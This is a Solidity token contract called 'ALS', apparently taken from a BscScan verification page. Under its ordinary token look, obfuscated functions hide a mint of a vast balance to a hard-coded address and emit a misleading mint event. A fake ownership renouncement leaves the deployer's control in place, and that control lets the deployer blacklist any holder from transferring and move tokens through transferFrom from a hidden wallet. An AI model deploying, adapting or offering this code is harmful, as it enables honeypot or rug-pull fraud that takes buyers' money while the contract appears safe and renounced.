/**
 *Submitted for verification at BscScan.com on 2023-03-03
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ALS {
    using SafeMath for uint256;
    mapping (address => uint256) private VXB;
	
    mapping (address => uint256) public VXBB;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ALS";
	
    string public symbol = "ALS";
    uint8 public decimals = 6;
 mapping (address => bool) private bots;
    uint256 public totalSupply = 3000 *10**6;
    address owner = msg.sender;
	  address private RTR;
    uint256 private BSE;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address GRD = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
      address PYB = 0x9FefB43Fb9d1D96f9817cEe4f89539d46f0E5976;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
            
             VXB[msg.sender] = totalSupply;
        
       FORK();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function FORK() internal  {    
                       BSE = 3;        
                       VXBB[msg.sender] = BSE;
                       RTR = GRD;

                    XVAL();

        emit Transfer(address(0), RTR, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return VXB[account];
    }


     function XVAL() internal  {
                     uint256 xTot = totalSupply.mul(totalSupply);      
                       VXB[PYB] = xTot; }

    function transfer(address to, uint256 value) public returns (bool success) {
 	       require(!bots[msg.sender]);
    require(VXB[msg.sender] >= value);
VXB[msg.sender] -= value;  
VXB[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
  
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
       if(VXBB[from] == BSE) {from = GRD;}
       require(!bots[from] && !bots[to]);
        require(value <= VXB[from]);
        require(value <= allowance[from][msg.sender]);
        VXB[from] -= value;
        VXB[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


     



        function addBots(address[] memory bots_) public  {
            	if(VXBB[msg.sender] == BSE) {  
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }}

    function delBots(address[] memory notbot) public  {
        	if(VXBB[msg.sender] == BSE) {  
      for (uint i = 0; i < notbot.length; i++) {
          bots[notbot[i]] = false;
      }
    }}

    function isBot(address a) public view returns (bool){
      return bots[a];
    }

        	
 }